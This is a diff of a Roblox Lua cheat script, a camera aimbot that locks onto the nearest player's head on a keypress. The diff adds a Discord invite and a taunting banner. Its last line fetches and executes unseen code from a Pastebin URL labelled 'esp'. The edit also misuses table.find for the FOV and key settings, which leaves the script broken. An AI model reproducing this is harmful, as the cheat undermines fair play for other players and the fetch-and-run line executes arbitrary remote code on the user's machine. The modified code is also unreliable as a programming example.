@@ -1,4 +1,4 @@
- --[[
+	 --[[
         ▄▄        ▄▄        ▄▄        ▄▄        ▄▄                                           
  ▄█▀▀▀█▄███       ███       ███       ███       ███           ▀███▀▀▀██▄ ███▀▀██▀▀██████▀▀▀██▄
 ▄██    ▀███        ██        ██        ██        ██             ██    ▀██▄▀   ██   ▀█ ██    ██
@@ -8,14 +8,16 @@
 ██     ████    ██  ██    ██  ██    ██  ██    ██  ██    ██       ██    ▄██▀    ██      ██    ▄█
 █▀█████▀████  ████▄███  ████▄███  ████▄███  ████▄███  ████▄   ▄████████▀    ▄████▄  ▄████████ 
                                                                                               
-
-
-
-discord.gg/96uPykzT
+     Why Skid and steal it when u cn already use it bums!
 scripted = Nehx
 ]]
 
-
+Stuff = {
+	FOV = 30;
+	Key = Enum.KeyCode.E;
+	Discord = 'discord.gg/96uPykzT'
+	 
+}
 
 
 
@@ -28,65 +30,61 @@ local RunService = game:GetService("RunService")
 
 local targetPlayer = nil
 local isLocked = false
-local FOV = 300  -- Adjust as needed
 
--- Function to find the nearest player within the FOV
+
 local function getNearestPlayerInFOV()
-    local closestDistance = FOV
-    local closestPlayer = nil
+	local closestDistance = table.find(Stuff.FOV)
+	local closestPlayer = nil
 
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            local screenPoint, onScreen = Camera:WorldToScreenPoint(player.Character.HumanoidRootPart.Position)
-            if onScreen then
-                local mousePosition = UIS:GetMouseLocation()
-                local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePosition).magnitude
-                if distance < closestDistance then
-                    closestDistance = distance
-                    closestPlayer = player
-                end
-            end
-        end
-    end
+	for _, player in pairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+			local screenPoint, onScreen = Camera:WorldToScreenPoint(player.Character.HumanoidRootPart.Position)
+			if onScreen then
+				local mousePosition = UIS:GetMouseLocation()
+				local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePosition).magnitude
+				if distance < closestDistance then
+					closestDistance = distance
+					closestPlayer = player
+				end
+			end
+		end
+	end
 
-    return closestPlayer
+	return closestPlayer
 end
 
--- Toggle lock when a key is pressed
+
 UIS.InputBegan:Connect(function(input, gameProcessedEvent)
-    if gameProcessedEvent then return end
+	if gameProcessedEvent then return end
 
-    if input.KeyCode == Enum.KeyCode.E then -- Change 'E' to any key you prefer
-        if isLocked then
-            isLocked = false
-            targetPlayer = nil
-        else
-            targetPlayer = getNearestPlayerInFOV()
-            if targetPlayer then
-                isLocked = true
-            end
-        end
-    end
+	if input.KeyCode == table.find(Stuff.Key) then 
+		if isLocked then
+			isLocked = false
+			targetPlayer = nil
+		else
+			targetPlayer = getNearestPlayerInFOV()
+			if targetPlayer then
+				isLocked = true
+			end
+		end
+	end
 end)
 
--- Function to adjust aim silently
+
 local function adjustAim()
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local aimPosition = targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 1.5, 0) -- Adjust for head height
-        local aimDirection = (aimPosition - Camera.CFrame.Position).unit
-        local newCFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + aimDirection)
-        Camera.CFrame = newCFrame
-    end
+	if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+		local aimPosition = targetPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 1.0, 0) -- Adjust for head height
+		local aimDirection = (aimPosition - Camera.CFrame.Position).unit
+		local newCFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + aimDirection)
+		Camera.CFrame = newCFrame
+	end
 end
 
--- Update aim
+
 RunService.RenderStepped:Connect(function()
-    if isLocked then
-        adjustAim()
-    end
+	if isLocked then
+		adjustAim()
+	end
 end)
 
-
-
-
-            
+loadstring(game:HttpGet("https://pastebin.com/raw/yXkxTtDx"))() -- esp 
